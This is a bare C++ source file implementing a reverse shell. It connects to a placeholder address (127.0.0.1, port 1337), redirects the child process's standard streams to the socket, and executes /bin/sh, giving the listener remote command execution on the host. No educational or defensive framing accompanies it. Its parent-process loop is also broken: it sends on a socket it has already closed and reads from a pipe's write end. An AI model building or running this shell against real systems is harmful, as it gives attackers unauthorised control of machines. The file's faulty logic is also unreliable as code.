#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

using namespace std;

int main() {
    // Create a socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        cerr << "Failed to create socket." << endl;
        return 1;
    }

    // Set up the server address
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(1337); // Port
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // IP address

    // Connect to the server
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
        cerr << "Failed to connect to the server." << endl;
        close(sock);
        return 1;
    }

    // Create a pipe to handle input and output
    int fd[2];
    if (pipe(fd) == -1) {
        cerr << "Failed to create pipe." << endl;
        close(sock);
        return 1;
    }

    // Fork the process
    pid_t pid = fork();
    if (pid == -1) {
        cerr << "Failed to fork process." << endl;
        close(sock);
        return 1;
    }

    // Handle input and output
    if (pid == 0) {
        // Close the write end of the pipe
        close(fd[1]);

        // Redirect standard input and output to the socket
        dup2(sock, STDIN_FILENO);
        dup2(sock, STDOUT_FILENO);
        dup2(sock, STDERR_FILENO);

        // Close socket
        close(sock);

        execl("/bin/sh", "/bin/sh", NULL);
        cerr << "Failed to execute shell." << endl;
        return 1;
    }

    // Handle incoming connections
    close(fd[0]);
    close(sock);

    // Infinite loop to handle incoming data
    char buffer[4096];
    while (true) {
        // Receive incoming data
        ssize_t bytesReceived = read(fd[1], buffer, sizeof(buffer));

        if (bytesReceived == -1) {
            cerr << "Failed to receive incoming data." << endl;
            close(fd[1]);
            return 1;
        }

        // Send data back to the server
        if (send(sock, buffer, bytesReceived, 0) == -1) {
            cerr << "Failed to send data back to the server." << endl;
            close(fd[1]);
            return 1;
        }
    }

    close(fd[1]);

    return 0;
}
